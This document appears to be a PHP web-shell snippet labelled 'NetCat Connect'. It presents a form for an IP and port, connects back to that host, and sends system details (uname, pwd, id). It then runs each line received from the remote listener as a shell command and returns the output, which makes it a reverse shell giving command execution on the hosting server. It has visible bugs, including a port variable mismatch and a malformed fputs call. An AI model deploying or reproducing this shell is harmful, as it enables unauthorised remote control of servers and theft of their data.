 <? 
echo "<br><b>NetCat Connect<br>  
            Usage: nc -vlp 443<br> 
            <hr>  
            <form method='POST' action=''><br>  
            Your IP & Port:<br>  
            <input type='text' name='ip' size='15' value=''> 
            <input type='text' name='port' size='5' value='21'><br><br>  
            <input type='submit' value='Connect'><br><br> 
            <hr> 
            </form>";  
             
         $ip =$_POST['ip'];  
         $portum=$_POST['port'];  
         if ($ip <> "")  
         {  
         $mucx=fsockopen($ip , $port , $errno, $errstr );  
         if (!$mucx){  
               $result = "Error: connect Faild ...";  
         }  
         else {  
          
         $zamazing0="\n"; 
                   
         fputs ($mucx ,"\n-==  Welcome ==-\n\n"); 
         fputs($mucx , system("uname -a") .$zamazing0 ); 
         fputs($mucx , system("pwd") .$zamazing0 ); 
         fputs($mucx , system("id") .$zamazing0.$zamazing0 ); 
         while(!feof($mucx)){   
       fputs ($mucx);  
       $one="[$"; 
       $two="]"; 
       $result= fgets ($mucx, 8192);  
      $message=`$result`;  
       fputs ($mucx, $one. system("whoami") .$two. " " .$message."\n");  
      }  
      fclose ($mucx);  
         }  
         }  

?> 